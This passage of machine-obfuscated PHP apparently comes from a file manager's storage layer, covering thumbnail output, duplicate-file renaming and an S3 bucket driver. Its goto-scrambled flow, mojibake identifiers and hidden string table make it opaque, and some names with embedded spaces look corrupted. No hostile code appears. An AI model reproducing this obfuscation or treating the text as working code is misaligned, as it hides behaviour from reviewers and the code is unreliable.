(!is_null($b–Îœè¤µŠ)) { return $b–Îœè¤µŠ; } goto d«ä˜à¥†‰; cïôøìÕØ£: } public function fileOutImage($dÔĞĞ¾…Ğó, $BìÕÇˆÕ•Š = 250) { goto b»ôŠë‚½; fÅÅÏ‚á×: $B¥ÖÜŞœ¥” = $this->info($dÔĞĞ¾…Ğó); $f°éá•É¸¬ = $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[28]]; $C·ÏÅ‹ÓÑñ = !1; goto E‘¢Œ‰‡í; bÄÔ½»ëå: if (!@file_exists($dÊôĞ½õ‡¦)) { $E³õ¡ÙáÃ = TEMP_FILES; if (!is_dir($E³õ¡ÙáÃ)) { mk_dir($E³õ¡ÙáÃ); } $FØõÊÉÔÃ™ = $E³õ¡ÙáÃ . $B‚È‡ Ç . $E•Ì‚ï‡È[95] . $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[168]]; if (!@file_exists($FØõÊÉÔÃ™)) { $FØõÊÉÔÃ™ = $this->download($dÔĞĞ¾…Ğó, $FØõÊÉÔÃ™); } ImageThumb::createThumb($FØõÊÉÔÃ™, $dÊôĞ½õ‡¦, $BìÕÇˆÕ•Š, $BìÕÇˆÕ•Š * 10); } if (!file_exists($dÊôĞ½õ‡¦) || filesize($dÊôĞ½õ‡¦) < 100) { return @file_exists($FØõÊÉÔÃ™) ? IO::fileOut($FØõÊÉÔÃ™) : $this->fileOut($dÔĞĞ¾…Ğó); } if (!($Aé›Ğ¿ç¿Ÿ = IO::move($dÊôĞ½õ‡¦, $aöíŠ–Óà„))) { return IO::fileOut($dÊôĞ½õ‡¦); } goto b»‹õ´ìƒ; b»‹õ´ìƒ: del_file($dÊôĞ½õ‡¦); IO::fileOut($Aé›Ğ¿ç¿Ÿ); goto dŞÉƒ´ƒ; aÑÌî¶Â•: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $dÊôĞ½õ‡¦ = DATA_THUMB . $EêººåÓí¨; del_file($dÊôĞ½õ‡¦); goto bÄÔ½»ëå; b»ôŠë‚½: $E•Ì‚ï‡È =& $_SERVER[æ§›¦ÌáØ]; set_timeout(); if (substr($dÔĞĞ¾…Ğó, 0, 4) == $E•Ì‚ï‡È[147]) { $this->fileOutLink($dÔĞĞ¾…Ğó); } goto fÅÅÏ‚á×; eßª‚óö‘: $EêººåÓí¨ = "{$B‚È‡ Ç}\137{$BìÕÇˆÕ•Š}\56\160\x6e\147"; if (!($Aä¾¨»êÕâ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $E•Ì‚ï‡È[172]))) { $aöíŠ–Óà„ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $E•Ì‚ï‡È[173]); } else { $aöíŠ–Óà„ = KodIO::make($Aä¾¨»êÕâ); } if ($Aä¾¨»êÕâ = IO::fileNameExist($aöíŠ–Óà„, $EêººåÓí¨)) { $dÊôĞ½õ‡¦ = KodIO::make($Aä¾¨»êÕâ); return IO::fileOut($dÊôĞ½õ‡¦, !1, $f°éá•É¸¬); } goto aÑÌî¶Â•; E‘¢Œ‰‡í: if (isset($GLOBALS[$E•Ì‚ï‡È[162]]) && $GLOBALS[$E•Ì‚ï‡È[162]][$E•Ì‚ï‡È[76]] == $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[76]]) { $dƒ„Ø¬¾ = $GLOBALS[$E•Ì‚ï‡È[162]][$E•Ì‚ï‡È[163]]; if (!$B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]]) { $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]] = $GLOBALS[$E•Ì‚ï‡È[162]]; } if (isset($dƒ„Ø¬¾[$E•Ì‚ï‡È[165]])) { if ($dƒ„Ø¬¾[$E•Ì‚ï‡È[165]] <= $BìÕÇˆÕ•Š && $dƒ„Ø¬¾[$E•Ì‚ï‡È[166]] <= $BìÕÇˆÕ•Š) { $C·ÏÅ‹ÓÑñ = !0; } } $f°éá•É¸¬ = $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]][$E•Ì‚ï‡È[28]]; } if ($B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[78]] <= 1024 * 50 || $C·ÏÅ‹ÓÑñ || !function_exists($E•Ì‚ï‡È[167]) || $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[168]] == $E•Ì‚ï‡È[169]) { return $this->fileOut($dÔĞĞ¾…Ğó, !1, $f°éá•É¸¬); } if (isset($B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]][$E•Ì‚ï‡È[170]])) { $B‚È‡ Ç = $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]][$E•Ì‚ï‡È[170]]; } else { if (isset($B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]][$E•Ì‚ï‡È[171]])) { $B‚È‡ Ç = $B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[164]][$E•Ì‚ï‡È[171]]; } else { $B‚È‡ Ç = md5("{$B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[28]]}\137{$B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[76]]}\x5f{$B¥ÖÜŞœ¥”[$E•Ì‚ï‡È[78]]}"); } } goto eßª‚óö‘; dŞÉƒ´ƒ: } public function fileOutImageServer($dÓ˜İÓáØ, $Cùß»­œÛ¨ = 250) { $this->fileOutImage($dÓ˜İÓáØ, $Cùß»­œÛ¨); } public function fileNameAuto($Eğ¡›­‡°¢, $d£íåêùœÅ, $b÷¬í…¨ · = REPEAT_RENAME, $fïÉ¤©â = false) { goto C¹ÉˆïÉà®; C¹ÉˆïÉà®: $bô†ØÖ‰ñƒ =& $_SERVER[æ§›¦ÌáØ]; $eíÏè³”·¿ = $Eğ¡›­‡°¢ === $bô†ØÖ‰ñƒ[33] ? $d£íåêùœÅ : rtrim($Eğ¡›­‡°¢, $bô†ØÖ‰ñƒ[8]) . $bô†ØÖ‰ñƒ[8] . $d£íåêùœÅ; if ($b÷¬í…¨ · == REPEAT_REPLACE || !$this->exist($eíÏè³”·¿) || $fïÉ¤©â && $b÷¬í…¨ · != REPEAT_RENAME_FOLDER) { return $d£íåêùœÅ; } goto F÷ï’—ï–È; F÷ï’—ï–È: if ($b÷¬í…¨ · == REPEAT_SKIP) { return !1; } $cÌÃÂˆÆŞ = $bô†ØÖ‰ñƒ[95] . get_path_ext($d£íåêùœÅ); $cÌÃÂˆÆŞ = $cÌÃÂˆÆŞ == $bô†ØÖ‰ñƒ[95] || $fïÉ¤©â ? $bô†ØÖ‰ñƒ[33] : $cÌÃÂˆÆŞ; goto AÏòÚ±Ï¯ë; AÏòÚ±Ï¯ë: $C£÷ğé× = 1; $a‘‡ÔßÇ = substr($d£íåêùœÅ, 0, strlen($d£íåêùœÅ) - strlen($cÌÃÂˆÆŞ)); $câƒŞàŒ© = $a‘‡ÔßÇ . "\x28{$C£÷ğé×}\x29{$cÌÃÂˆÆŞ}"; goto cŞª°æíğš; cŞª°æíğš: while ($this->exist(rtrim($Eğ¡›­‡°¢, $bô†ØÖ‰ñƒ[8]) . $bô†ØÖ‰ñƒ[8] . $câƒŞàŒ©)) { $câƒŞàŒ© = $a‘‡ÔßÇ . "\50{$C£÷ğé×}\x29{$cÌÃÂˆÆŞ}"; $C£÷ğé×++; } return $câƒŞàŒ©; goto B÷ÑÔš‘¢»; B÷ÑÔš‘¢»: } private function fileNameAutoList($b¸Ñ±…à¦…, $bäšÅÛØò×, $D¥§äï×¬È = false) { goto cŠ§÷äŠäÜ; c¸ÁĞÍİã‹: return $cèì¶Ò’Ñİ; goto aè†Ê×Ù´‚; f¼À¿ƒ¯ìÚ: $E¾šãÏÂÃà = array_to_keyvalue($F÷½¹¤ˆÉã, $BîÄÇ­ÅºÆ[33], $BîÄÇ­ÅºÆ[28]); $c¤™å²§êà = $BîÄÇ­ÅºÆ[95] . get_path_ext($bäšÅÛØò×); $c¤™å²§êà = $c¤™å²§êà == $BîÄÇ­ÅºÆ[95] || $D¥§äï×¬È ? $BîÄÇ­ÅºÆ[33] : $c¤™å²§êà; goto d°Áİ¹§»«; cŠ§÷äŠäÜ: $BîÄÇ­ÅºÆ =& $_SERVER[æ§›¦ÌáØ]; $F÷½¹¤ˆÉã = $this->listPath($b¸Ñ±…à¦…, !0); $F÷½¹¤ˆÉã = array_merge($F÷½¹¤ˆÉã[$BîÄÇ­ÅºÆ[75]], $F÷½¹¤ˆÉã[$BîÄÇ­ÅºÆ[74]]); goto f¼À¿ƒ¯ìÚ; d°Áİ¹§»«: $D”Ğ¤‹Íî = substr($bäšÅÛØò×, 0, strlen($bäšÅÛØò×) - strlen($c¤™å²§êà)); $cèì¶Ò’Ñİ = $D”Ğ¤‹Íî . "\50\60\51{$c¤™å²§êà}"; for ($AÀğÏ«¿¯± = 1; $AÀğÏ«¿¯± <= count($E¾šãÏÂÃà) + 1; $AÀğÏ«¿¯±++) { $cèì¶Ò’Ñİ = $D”Ğ¤‹Íî . "\50{$AÀğÏ«¿¯±}\x29{$c¤™å²§êà}"; if (!in_array_not_case($cèì¶Ò’Ñİ, $E¾šãÏÂÃà)) { return $cèì¶Ò’Ñİ; } } goto c¸ÁĞÍİã‹; aè†Ê×Ù´‚: } public function listAllFiles($dºŠÀôĞÄà, $DÌîò¡ÉÏ, $fêÖ¿ùø‚Ï = array()) { goto E­ê‡ÁÖˆ; E­ê‡ÁÖˆ: $BŠõÍ·ºÅ =& $_SERVER[æ§›¦ÌáØ]; if (empty($DÌîò¡ÉÏ)) { return array(); } $bã’’Ê¬Æ = array(); goto FŸØ¥“¤; FŸØ¥“¤: $dºŠÀôĞÄà = trim($dºŠÀôĞÄà, $BŠõÍ·ºÅ[8]); foreach ($DÌîò¡ÉÏ as $Eá´ô´ †) { $D˜ØÓäí¼ğ = ltrim(substr(trim($Eá´ô´ †, $BŠõÍ·ºÅ[8]), strlen($dºŠÀôĞÄà)), $BŠõÍ·ºÅ[8]); $bã’’Ê¬Æ = array_merge($bã’’Ê¬Æ, $this->slicePath($D˜ØÓäí¼ğ)); } $F©Ø¦à…å = array(); goto BŒ¸Ø‰‡…; BŒ¸Ø‰‡…: foreach (array_unique($bã’’Ê¬Æ) as $Eá´ô´ †) { $A—Æ —Ô´– = array($BŠõÍ·ºÅ[76] => $this->getPathOuter($BŠõÍ·ºÅ[8] . $dºŠÀôĞÄà . $BŠõÍ·ºÅ[8] . $Eá´ô´ †), $BŠõÍ·ºÅ[77] => 1, $BŠõÍ·ºÅ[78] => 0); if (substr($Eá´ô´ †, -1) != $BŠõÍ·ºÅ[8]) { $A—Æ —Ô´–[$BŠõÍ·ºÅ[77]] = 0; $Aî×Õôß¯ = $this->getPath($dºŠÀôĞÄà . $BŠõÍ·ºÅ[8] . $Eá´ô´ †); $A—Æ —Ô´–[$BŠõÍ·ºÅ[78]] = isset($fêÖ¿ùø‚Ï[$Aî×Õôß¯]) ? $fêÖ¿ùø‚Ï[$Aî×Õôß¯] : $this->size($Aî×Õôß¯); } $F©Ø¦à…å[] = $A—Æ —Ô´–; } return $F©Ø¦à…å; goto EÄ‘ä˜–¦¶; EÄ‘ä˜–¦¶: } public function slicePath($b¯·ò³ğ) { $bŸÈ¨¹ÀÓî =& $_SERVER[æ§›¦ÌáØ]; $dáİ‡±Ø„ˆ = explode($bŸÈ¨¹ÀÓî[8], trim($b¯·ò³ğ, $bŸÈ¨¹ÀÓî[8])); $a‘¹Øî«¢¼ = 0; do { ++$a‘¹Øî«¢¼; $DÇÅÁ¿æá›[] = implode($bŸÈ¨¹ÀÓî[8], array_slice($dáİ‡±Ø„ˆ, 0, $a‘¹Øî«¢¼)) . $bŸÈ¨¹ÀÓî[8]; } while ($a‘¹Øî«¢¼ < count($dáİ‡±Ø„ˆ)); $DÇÅÁ¿æá›[count($dáİ‡±Ø„ˆ) - 1] = $b¯·ò³ğ; return $DÇÅÁ¿æá›; } public function getHost() { $a¬··®ÁÌö =& $_SERVER[æ§›¦ÌáØ]; $aºÊ®’¼é„ = parse_url(trim($this->domain, $a¬··®ÁÌö[8])); $a»¿ù¤Øñê = isset($aºÊ®’¼é„[$a¬··®ÁÌö[174]]) ? $aºÊ®’¼é„[$a¬··®ÁÌö[174]] : http_type(); $DÓ¼ÓóòÀ = isset($aºÊ®’¼é„[$a¬··®ÁÌö[175]]) ? $aºÊ®’¼é„[$a¬··®ÁÌö[175]] : $aºÊ®’¼é„[$a¬··®ÁÌö[76]]; if (isset($aºÊ®’¼é„[$a¬··®ÁÌö[176]])) { $DÓ¼ÓóòÀ .= $a¬··®ÁÌö[4] . $aºÊ®’¼é„[$a¬··®ÁÌö[176]]; } return $a»¿ù¤Øñê . $a¬··®ÁÌö[177] . $DÓ¼ÓóòÀ; } public function pathEncode($eêÁ†½ÎÎ’) { $E¡î¿ÚİÏ˜ =& $_SERVER[æ§›¦ÌáØ]; return str_replace($E¡î¿ÚİÏ˜[178], $E¡î¿ÚİÏ˜[8], rawurlencode($eêÁ†½ÎÎ’)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($C‹˜É‰Ä¼¨) { set_timeout(); require_once SDK_DIR . $_SERVER[æ§›¦ÌáØ][179]; parent::__construct(); $this->_init($C‹˜É‰Ä¼¨); } public function _init($BùœˆÄ…•¯) { foreach ($BùœˆÄ…•¯ as $BİÂ¨ÛĞÔô => $A®ßà¨ÒŸ) { if (isset($this->{$BİÂ¨ÛĞÔô})) { $this->{$BİÂ¨ÛĞÔô} = $A®ßà¨ÒŸ; } } $this->endpoint = $BùœˆÄ…•¯[$_SERVER[æ§›¦ÌáØ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($fÜ½Š•‹ä = "\166\x34") { $this->signVer = $fÜ½Š•‹ä; $this->client->setSignatureVersion($fÜ½Š•‹ä); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto eƒ»àŸ—’Ô; F®¤ÍÂ®Îß: if ($B¸²…¸Ô‰‘[$eë¯®Øš‚ò[181]] != $eë¯®Øš‚ò[182] || $B¸²…¸Ô‰‘[$eë¯®Øš‚ò[183]] != $eë¯®Øš‚ò[182]) { return !1; } $Cå×ã³×öî = array_map($eë¯®Øš‚ò[184], $B¸²…¸Ô‰‘[$eë¯®Øš‚ò[185]]); if (!is_array($Cå×ã³×öî)) { $Cå×ã³×öî = array(); } goto FÆ‚µ³’Ìõ; FÆ‚µ³’Ìõ: $E•µ®ƒÈ‚¤ = array($eë¯®Øš‚ò[186], $eë¯®Øš‚ò[187], $eë¯®Øš‚ò[188], $eë¯®Øš‚ò[189], $eë¯®Øš‚ò[190]); $cøš¼öŒ‘ = array_diff($E•µ®ƒÈ‚¤, $Cå×ã³×öî); return empty($cøš¼öŒ‘); goto a…‡‡œæ”×; eƒ»àŸ—’Ô: $eë¯®Øš‚ò =& $_SERVER[æ§›¦ÌáØ]; $B¸²…¸Ô‰‘ = $this->getBucketCors(); if (!$B¸²…¸Ô‰‘ || !is_array($B¸²…¸Ô‰‘)) { return !1; } goto F®¤ÍÂ®Îß; a…‡‡œæ”×: } public function mkfile($BŒ²ÄÛÃ, $C­Û‚ŞÍï = '', $CóØäß¸³ = REPEAT_RENAME) { $c…ñØå‚ÍÎ = $this->setContent($BŒ²ÄÛÃ, $C­Û‚ŞÍï); if ($c…ñØå‚ÍÎ !== !1) { return $this->getPathOuter($BŒ²ÄÛÃ); } return !1; } public function mkdir($CÑ¶Ù’¤ÂÁ, $cáÍ•Áç…Ä = REPEAT_SKIP) { $A¥Ô‚÷›ç =& $_SERVER[æ§›¦ÌáØ]; if (empty($CÑ¶Ù’¤ÂÁ) && $CÑ¶Ù’¤ÂÁ !== $A¥Ô‚÷›ç[191]) { return !1; } if ($this->_isFolder($CÑ¶Ù’¤ÂÁ)) { return $this->getPathOuter($CÑ¶Ù’¤ÂÁ); } $dÈïŸã÷Ñø = $this->setContent($CÑ¶Ù’¤ÂÁ, $A¥Ô‚÷›ç[33], !0); if ($dÈïŸã÷Ñø !== !1) { return $this->getPathOuter($CÑ¶Ù’¤ÂÁ); } return !1; } public function copyFile($FàÄ¾å¥œ, $fîööÅ¦£, $fÓ¨æ®ïÆ = array()) { $cÈ—±ßä¹¢ =& $_SERVER[æ§›¦ÌáØ]; $D»÷ò–çÄ = $this->objectMeta($FàÄ¾å¥œ); if (!$D»÷ò–çÄ) { return !1; } if ($D»÷ò–çÄ[$cÈ—±ßä¹¢[78]] <= 1024 * 1024 * 200) { $B¨Ó«ÎÆ = $this->client->copyObject($this->bucket, $FàÄ¾å¥œ, $this->bucket, $fîööÅ¦£, $cÈ—±ßä¹¢[192], $fÓ¨æ®ïÆ); } else { $B¨Ó«ÎÆ = $this->client->multiCopyObject($this->bucket, $FàÄ¾å¥œ, $this->bucket, $fîööÅ¦£, $fÓ¨æ®ïÆ); } $B¨Ó«ÎÆ = $B¨Ó«ÎÆ ? $this->getPathOuter($fîööÅ¦£) : !1; return $B¨Ó«ÎÆ; } public function moveFile($AÌÅ‡®ŸÏ, $F´ëÏ) { if ($this->copyFile($AÌÅ‡®ŸÏ, $F´ëÏ)) { $this->delFile($AÌÅ‡®ŸÏ); return $this->getPathOuter($F´ëÏ); } return !1; } public function delFile($aä‘Ë‹Õ×µ) { return $this->client->deleteObject($this->bucket, $aä‘Ë‹Õ×µ); } public function delFolder($eÛÅ¾’äÈ) { goto cÄğÍ³¯áé; b·„‚ªäœ«: $bÒàäÈ½»Î = $this->delByBatch($AƒôÈÚÁÀ‹[$F…Êö¦¨“»[75]]); if (!$bÒàäÈ½»Î) { return !1; } return $this->delFile($f•Ï³èŞŒŠ); goto FƒÍèÊÌ¨­; B…Å›Å‰ö: if (!empty($eÛÅ¾’äÈ) && $eÛÅ¾’äÈ !== $F…Êö¦¨“»[191] && !in_array($f•Ï³èŞŒŠ, $AƒôÈÚÁÀ‹[$F…Êö¦¨“»[75]])) { $AƒôÈÚÁÀ‹[$F…Êö¦¨“»[75]][] = $f•Ï³èŞŒŠ; } $bÒàäÈ½»Î = $this->delByBatch($AƒôÈÚÁÀ‹[$F…Êö¦¨“»[74]]); if (!$bÒàäÈ½»Î) { return !1; } goto b·„‚ªäœ«; Fí…‡‚·©â: $AƒôÈÚÁÀ‹ = $this->fileList($eÛÅ¾’äÈ); $this->listItemCache = !0; $f•Ï³èŞŒŠ = trim($eÛÅ¾’äÈ, $F…Êö¦¨“»[8]) . $F…Êö¦¨“»[8]; goto B…Å›Å‰ö; cÄğÍ³¯áé: $F…Êö¦¨“» =& $_SERVER[æ§›¦ÌáØ]; if (!$this->exist($eÛÅ¾’äÈ)) { return !0; } $this->listItemCache = !1; goto Fí…‡‚·©â; FƒÍèÊÌ¨­: } private function delByBatch($C†Ô³ÉåÆ§) { foreach (array_chunk($C†Ô³ÉåÆ§, 1000) as $BäŞ›¹‰¨) { $C“óÄ¡´¾ = $this->client->deleteObjects($this->bucket, $BäŞ›¹‰¨); if (!$C“óÄ¡´¾) { return !1; } } return !0; } public function rename($bŸ…ÉÁ¹ÆÉ, $A©ŒËø¬º) { return $this->renameObject($bŸ…ÉÁ¹ÆÉ, $A©ŒËø¬º); } public function listPath($CÉ¢½«ÃÍ, $E¾›¿Üè› = false) { $Fàä™Ÿêá =& $_SERVER[æ§›¦ÌáØ]; $eÆÑª§Éêä = $this->fileList($CÉ¢½«ÃÍ, $Fàä™Ÿêá[8], !0); foreach ($eÆÑª§Éêä[$Fàä™Ÿêá[75]] as $Dè¸Ø¸£š¢ => $Eø  ÎÄ×) { $eÆÑª§Éêä[$Fàä™Ÿêá[75]][$Dè¸Ø¸£š¢] = $this->folderInfo($Eø  ÎÄ×, $E¾›¿Üè›); } foreach ($eÆÑª§Éêä[$Fàä™Ÿêá[74]] as $Dè¸Ø¸£š¢ => $Eø  ÎÄ×) { $eÆÑª§Éêä[$Fàä™Ÿêá[74]][$Dè¸Ø¸£š¢] = $this->fileInfo($Eø  ÎÄ×[$Fàä™Ÿêá[28]], $E¾›¿Üè›, $Eø  ÎÄ×); } return $eÆÑª§Éêä; } private function fileInfo($Dáå†ˆ²éà, $B•‰±ÙÆ¿ğ = false, $bÜğÀŞË°„ = array()) { goto CøÓŞ¾Ÿ”; Fİªáœª•Ò: if (isset($bÜğÀŞË°„[$F­Ã§×Õ¶[197]])) { $eêÓù’Â[$F­Ã§×Õ¶[84]] = $bÜğÀŞË°„[$F­Ã§×Õ¶[197]]; } if (isset($bÜğÀŞË°„[$F­Ã§×Õ¶[78]])) { $eêÓù’Â[$F­Ã§×Õ¶[78]] = $bÜğÀŞË°„[$F­Ã§×Õ¶[78]]; } return $eêÓù’Â; goto f¯èÊïÛã§; CøÓŞ¾Ÿ”: $F­Ã§×Õ¶ =& $_SERVER[æ§›¦ÌáØ]; $eêÓù’Â = array($F­Ã§×Õ¶[28] => $this->pathThis($Dáå†ˆ²éà), $F­Ã§×Õ¶[76] => $this->getPathOuter($Dáå†ˆ²éà), $F­Ã§×Õ¶[29] => $F­Ã§×Õ¶[193], $F­Ã§×Õ¶[168] => $this->ext($Dáå†ˆ²éà), $F­Ã§×Õ¶[78] => isset($bÜğÀŞË°„[$F­Ã§×Õ¶[78]]) ? $bÜğÀŞË°„[$F­Ã§×Õ¶[78]] : 0); if ($B•‰±ÙÆ¿ğ) { return $eêÓù’Â; } goto eå›–»§Ê¹; eå›–»§Ê¹: $eêÓù’Â[$F­Ã§×Õ¶[194]] = $eêÓù’Â[$F­Ã§×Õ¶[84]] = 0; $eêÓù’Â[$F­Ã§×Õ¶[195]] = $eêÓù’Â[$F­Ã§×Õ¶[196]] = !0; if (empty($bÜğÀŞË°„)) { $bÜğÀŞË°„ = $this->objectMeta($Dáå†ˆ²éà); if (!$bÜğÀŞË°„) { return $eêÓù’Â; } } goto Fİªáœª•Ò; f¯èÊïÛã§: } private function folderInfo($eõ¹óš», $bÅ‰†çŠĞƒ = false) { goto CŸîäçç±; f¡Šİ“§ : $eõ¹óš» = trim($eõ¹óš», $CÔ‘ÆóŒã[8]) . $CÔ‘ÆóŒã[8]; $AõÅä¯ã = $this->objectMeta($eõ¹óš»); if (isset($AõÅä¯ã[$CÔ‘ÆóŒã[197]])) { $EøğĞµ˜ë[$CÔ‘ÆóŒã[194]] = $AõÅä¯ã[$CÔ‘ÆóŒã[197]]; } goto a–Èò­‘•†; Fò’çÊŞ : $EøğĞµ˜ë[$CÔ‘ÆóŒã[194]] = $EøğĞµ˜ë[$CÔ‘ÆóŒã[84]] = 0; $EøğĞµ˜ë[$CÔ‘ÆóŒã[195]] = $EøğĞµ˜ë[$CÔ‘ÆóŒã[196]] = !0; if ($eõ¹óš» == $CÔ‘ÆóŒã[33]) { return $EøğĞµ˜ë; } goto f¡Šİ“§ ; a–Èò­‘•†: return $EøğĞµ˜ë; goto FŒ•¬à“å‚; CŸîäçç±: $CÔ‘ÆóŒã =& $_SERVER[æ§›¦ÌáØ]; $EøğĞµ˜ë = array($CÔ‘ÆóŒã[28] => $this->pathThis($eõ¹óš»), $CÔ‘ÆóŒã[76] => $this->getPathOuter($CÔ‘ÆóŒã[8] . $eõ¹óš»), $CÔ‘ÆóŒã[29] => $CÔ‘ÆóŒã[77]); if ($bÅ‰†çŠĞƒ) { return $EøğĞµ˜ë; } goto Fò’çÊŞ ; FŒ•¬à“å‚: } private function fileList($cˆÚŒ‰ƒ, $A¨Õé¿Ñ±± = '', $cÌË¼¹ö¤ = 0) { goto c’‡ôËåì; c’‡ôËåì: $b¹¦š‰ºñ =& $_SERVER[æ§›¦ÌáØ]; $CÇÚ¯ô´Õ = rtrim($cˆÚŒ‰ƒ, $b¹¦š‰ºñ[8]) . $b¹¦š‰ºñ[8]; $aÙ×ç‹ÖÏ¼ = $this->listObjs($CÇÚ¯ô´Õ, null, null, $A¨Õé¿Ñ±±); goto bÔ½Áìã™¬; E¬Ä‡—¦Ä©: foreach ($aÙ×ç‹ÖÏ¼[$b¹¦š‰ºñ[198]] as $bÇ¦ïøŒ×İ) { goto DÎ…³ê²™ò; c¶•ó‡Ô´ƒ: $EöçË¥Ø[] = $cÌË¼¹ö¤ ? $bÇ¦ïøŒ×İ : $FƒØ–âÖÊ¥; goto DçŒ­Û†àÛ; DÎ…³ê²™ò: $FƒØ–âÖÊ¥ = $bÇ¦ïøŒ×İ[$b¹¦š‰ºñ[28]]; if ($FƒØ–âÖÊ¥ == $CÇÚ¯ô´Õ) { continue; } $D™Ì»‡†×Í = isset($bÇ¦ïøŒ×İ[$b¹¦š‰ºñ[78]]) ? $bÇ¦ïøŒ×İ[$b¹¦š‰ºñ[78]] : 0; goto f©êß—Éˆñ; f©êß—Éˆñ: $b½ëæíˆ© = $D™Ì»‡†×Í == 0 && substr($FƒØ–âÖÊ¥, strlen($FƒØ–âÖÊ¥) - 1, 1) == $b¹¦š‰ºñ[8] ? !0 : !1; if ($c¦šÄˆ¡í±) { $this->cacheMethod($b¹¦š‰ºñ[199], $FƒØ–âÖÊ¥, $b½ëæíˆ©); $this->cacheMethod($b¹¦š‰ºñ[200], $FƒØ–âÖÊ¥, $bÇ¦ïøŒ×İ); } if ($b½ëæíˆ©) { $a±Ôòªó¯“[] = $FƒØ–âÖÊ¥; continue; } goto c¶•ó‡Ô´ƒ; DçŒ­Û†àÛ: } foreach ($aÙ×ç‹ÖÏ¼[$b¹¦š‰ºñ[201]] as $bÇ¦ïøŒ×İ) { $a±Ôòªó¯“[] = $bÇ¦ïøŒ×İ[$b¹¦š‰ºñ[28]]; if ($c¦šÄˆ¡í±) { $this->cacheMethod($b¹¦š‰ºñ[199], $bÇ¦ïøŒ×İ[$b¹¦š‰ºñ[28]], !0); } } if ($c¦šÄˆ¡í±) { $this->cacheMethod($b¹¦š‰ºñ[199], $cˆÚŒ‰ƒ, !0); } goto eÖ‰¤Æ‡ƒ; eÖ‰¤Æ‡ƒ: return array($b¹¦š‰ºñ[75] => $a±Ôòªó¯“, $b¹¦š‰ºñ[74] => $EöçË¥Ø); goto fœ½öùº³ƒ; bÔ½Áìã™¬: if (!$aÙ×ç‹ÖÏ¼) { return array($b¹¦š‰ºñ[75] => array(), $b¹¦š‰ºñ[74] => array()); } $c¦šÄˆ¡í± = $this->listItemCache === !1 ? !1 : !0; $a±Ôòªó¯“ = $EöçË¥Ø = array(); goto E¬Ä‡—¦Ä©; fœ½öùº³ƒ: } private function listObjs($F¤…²Ş†Ê, $Bƒ¼ö‘Üµ = null, $CçÆ’åã˜¾ = null, $CÔ“Ñ­÷¿í = null) { $Eê·ê’Ú± =& $_SERVER[æ§›¦ÌáØ]; $F¤…²Ş†Ê = trim($F¤…²Ş†Ê, $Eê·ê’Ú±[8]); $e¨¬øÜ„´¼ = empty($F¤…²Ş†Ê) && $F¤…²Ş†Ê !== $Eê·ê’Ú±[191] ? $Eê·ê’Ú±[33] : $F¤…²Ş†Ê . $Eê·ê’Ú±[8]; return $this->client->getBucket($this->bucket, $e¨¬øÜ„´¼, $Bƒ¼ö‘Üµ, $CçÆ’åã˜¾, $CÔ“Ñ­÷¿í, !0); } public function has($e†ŒÅöËŸ, $Cå¥‰ö­Ô = false, $D¸ƒ­‡‚Ãô = true) { goto FÄ¹ÃƒÀš; FœŒÁÄ´Ù: $aô·Â¹³¨ = null; $fÚ¿ÀÈ‚Š = 500; $f¸…ŸÚëÔæ = $D«•†¨“ó[8]; goto c¡¨ŠÔ¯Ì; AêéÑ§÷‹Û: return !1; goto ešœè¾Ë´¶; FÄ¹ÃƒÀš: $D«•†¨“ó =& $_SERVER[æ§›¦ÌáØ]; $e†ŒÅöËŸ = trim($e†ŒÅöËŸ, $D«•†¨“ó[8]); $dÛ´…óºÉ = empty($e†ŒÅöËŸ) && $e†ŒÅöËŸ !== $D«•†¨“ó[191] ? $D«•†¨“ó[33] : $e†ŒÅöËŸ . $D«•†¨“ó[8]; goto FœŒÁÄ´Ù; c¡¨ŠÔ¯Ì: $fã…ÛµÕ¾ = $C‘®ôøÇ¼Ê = array(); while (!0) { $eĞ…å‚áÚÊ = $this->listObjs($e†ŒÅöËŸ, $aô·Â¹³¨, $fÚ¿ÀÈ‚Š, $f¸…ŸÚëÔæ); if (!$eĞ…å‚áÚÊ) { break; } $aô·Â¹³¨ = $eĞ…å‚áÚÊ[$D«•†¨“ó[202]]; $BìØ…Ê®÷ƒ = $eĞ…å‚áÚÊ[$D«•†¨“ó[198]]; $bî¥»ÎÕİº = $eĞ…å‚áÚÊ[$D«•†¨“ó[201]]; if (empty($BìØ…Ê®÷ƒ) && empty($bî¥»ÎÕİº)) { break; } if (count($BìØ…Ê®÷ƒ) == 1 && $BìØ…Ê®÷ƒ[0][$D«•†¨“ó[28]] == $dÛ´…óºÉ) { break; } if ($Cå¥‰ö­Ô) { if (count($BìØ…Ê®÷ƒ)) { $BìØ…Ê®÷ƒ = array_column($BìØ…Ê®÷ƒ, $D«•†¨“ó[28]); $fã…ÛµÕ¾ = array_merge($fã…ÛµÕ¾, $BìØ…Ê®÷ƒ); } if (count($bî¥»ÎÕİº)) { $bî¥»ÎÕİº = array_column($bî¥»ÎÕİº, $D«•†¨“ó[28]); $C‘®ôøÇ¼Ê = array_merge($C‘®ôøÇ¼Ê, $bî¥»ÎÕİº); } if ($aô·Â¹³¨ === null) { break; } continue; } if ($D¸ƒ­‡‚Ãô) { if (!empty($BìØ…Ê®÷ƒ)) { if 